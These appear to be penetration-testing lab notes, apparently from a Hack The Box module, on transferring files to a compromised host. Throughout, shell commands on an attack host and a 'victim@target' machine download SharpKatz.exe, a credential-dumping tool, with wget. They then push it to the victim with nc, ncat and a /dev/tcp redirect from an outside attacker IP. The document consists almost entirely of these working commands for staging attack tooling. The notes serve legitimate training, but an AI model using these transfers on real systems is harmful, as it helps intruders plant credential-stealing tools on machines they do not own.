
#### NetCat - Compromised Machine - Listening on Port 8000


```shell
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc -l -p 8000 > SharpKatz.exe


victim@target:~$ # Example using Ncat
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe

```

#### Netcat - Attack Host - Sending File to Compromised machine


```shell
vincentcheung@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe

vincentcheung@htb[/htb]$ # Example using Original Netcat

vincentcheung@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe

```

#### Ncat - Attack Host - Sending File to Compromised machine


```shell
vincentcheung@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe

vincentcheung@htb[/htb]$ # Example using Ncat

vincentcheung@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```


#### Attack Host - Sending File as Input to Netcat


```shell

vincentcheung@htb[/htb]$ # Example using Original Netcat
vincentcheung@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe

```

#### Compromised Machine Connect to Netcat to Receive the File

```shell

victim@target:~$ # Example using Original Netcat
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe

```


#### Attack Host - Sending File as Input to Ncat


```shell

vincentcheung@htb[/htb]$ # Example using Ncat
vincentcheung@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe

```

#### Compromised Machine Connect to Ncat to Receive the File

  

```shell

victim@target:~$ # Example using Ncat
victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe

```


#### NetCat - Sending File as Input to Netcat


```shell

vincentcheung@htb[/htb]$ # Example using Original Netcat
vincentcheung@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe

```

#### Ncat - Sending File as Input to Ncat


```shell

vincentcheung@htb[/htb]$ # Example using Ncat
vincentcheung@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe

```

#### Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File


```shell

victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe

```